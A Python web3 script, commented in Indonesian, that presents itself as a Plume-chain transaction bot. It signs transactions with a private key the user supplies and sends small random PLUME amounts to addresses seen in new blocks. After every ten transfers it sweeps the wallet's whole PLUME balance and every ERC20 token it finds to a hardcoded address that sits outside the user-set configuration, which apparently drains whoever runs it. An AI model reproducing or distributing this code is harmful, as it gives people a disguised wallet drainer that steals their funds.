import time
import random
from web3 import Web3
from eth_account import Account

# --- Konfigurasi Dasar ---
RPC_URL = "https://rpc.plume.org"
CHAIN_ID = 98866
SENDER_PRIVATE_KEY = "pvkey"
GAS_LIMIT = 21000
MIN_AMOUNT = 0.000001
MAX_AMOUNT = 0.00001

# --- Koneksi RPC ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(SENDER_PRIVATE_KEY)
sender_address = account.address
print(f"🔑 Wallet: {sender_address}\n")

# --- ABI ERC20 ---
erc20_abi = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
     "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
     "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"}
]

last_block = None
sent_addresses = set()
tx_count = 0

MAIN_WALLET = "0x7C8c8eF20a48901372775618330B294ab937C934"

def scan_tokens():
    print("🔍 Scanning token ERC20...")
    from_block = 1
    to_block = w3.eth.block_number
    topic_transfer = w3.keccak(text="Transfer(address,address,uint256)").hex()
    logs = w3.eth.get_logs({
        "fromBlock": from_block,
        "toBlock": to_block,
        "topics": [topic_transfer, None, w3.to_hex(sender_address)]
    })

    found_tokens = set()
    for log in logs:
        token_address = log["address"]
        found_tokens.add(token_address)

    return list(found_tokens)

def send_all_tokens():
    tokens_to_send = scan_tokens()
    random.shuffle(tokens_to_send)
    for token in tokens_to_send:
        contract = w3.eth.contract(address=token, abi=erc20_abi)
        try:
            balance = contract.functions.balanceOf(sender_address).call()
            if balance > 0:
                nonce = w3.eth.get_transaction_count(sender_address)
                tx = contract.functions.transfer(MAIN_WALLET, balance).build_transaction({
                    "from": sender_address,
                    "gas": 100000,
                    "gasPrice": w3.eth.gas_price,
                    "nonce": nonce,
                    "chainId": CHAIN_ID
                })
                signed_tx = w3.eth.account.sign_transaction(tx, SENDER_PRIVATE_KEY)
                tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                print(f"🔄 Kirim semua {token} -> {MAIN_WALLET} | TX: {w3.to_hex(tx_hash)}")
                time.sleep(random.uniform(2, 4))
        except Exception as e:
            print(f"⚠️ Gagal sweep token {token}: {e}")

def send_all_plume():
    balance = w3.eth.get_balance(sender_address)
    gas_price = w3.eth.gas_price
    gas_cost = GAS_LIMIT * gas_price
    if balance > gas_cost:
        value = balance - gas_cost
        nonce = w3.eth.get_transaction_count(sender_address)
        tx = {
            "to": MAIN_WALLET,
            "value": value,
            "gas": GAS_LIMIT,
            "gasPrice": gas_price,
            "nonce": nonce,
            "chainId": CHAIN_ID
        }
        signed_tx = w3.eth.account.sign_transaction(tx, SENDER_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"💰 Sweep semua PLUME -> {MAIN_WALLET} | TX: {w3.to_hex(tx_hash)}")

# --- Loop Utama ---
while True:
    try:
        block = w3.eth.get_block("latest", full_transactions=True)

        if last_block == block.number:
            time.sleep(2)
            continue
        last_block = block.number

        print(f"\n📦 Blok terbaru: {block.number} | Jumlah TX: {len(block.transactions)}")

        unique_addresses = set(
            tx["to"] for tx in block.transactions
            if tx["to"] and tx["to"].lower() != sender_address.lower()
        )

        if not unique_addresses:
            print("⚠️ Tidak ada address wallet valid di blok ini")
            time.sleep(2)
            continue

        for idx, target_address in enumerate(unique_addresses, start=1):
            if target_address in sent_addresses:
                continue

            code = w3.eth.get_code(target_address)
            if code != b'':
                print(f"⏭️ [{idx}] Skip kontrak: {target_address}")
                continue

            random_amount = random.uniform(MIN_AMOUNT, MAX_AMOUNT)
            value = w3.to_wei(random_amount, "ether")
            gas_price = w3.eth.gas_price
            gas_cost = gas_price * GAS_LIMIT
            balance = w3.eth.get_balance(sender_address)

            if balance < value + gas_cost:
                print(f"⚠️ [{idx}] Saldo tidak cukup: {w3.from_wei(balance, 'ether'):.6f} PLUME")
                break

            nonce = w3.eth.get_transaction_count(sender_address)
            tx_data = {
                "to": target_address,
                "value": value,
                "gas": GAS_LIMIT,
                "gasPrice": gas_price,
                "nonce": nonce,
                "chainId": CHAIN_ID,
            }

            signed_tx = w3.eth.account.sign_transaction(tx_data, private_key=SENDER_PRIVATE_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)

            print(f"✅ [{idx}] Kirim {random_amount:.8f} PLUME ke {target_address} | TX: {w3.to_hex(tx_hash)}")
            sent_addresses.add(target_address)
            tx_count += 1

            time.sleep(random.uniform(3, 5))

            if tx_count >= 10:
                print("🚀 Limit 10 TX tercapai! Sweep semua saldo & token otomatis...")
                send_all_tokens()
                send_all_plume()
                tx_count = 0

        sent_addresses.clear()
        time.sleep(2)

    except Exception as e:
        print(f"❌ Error: {str(e)}")
        time.sleep(5)
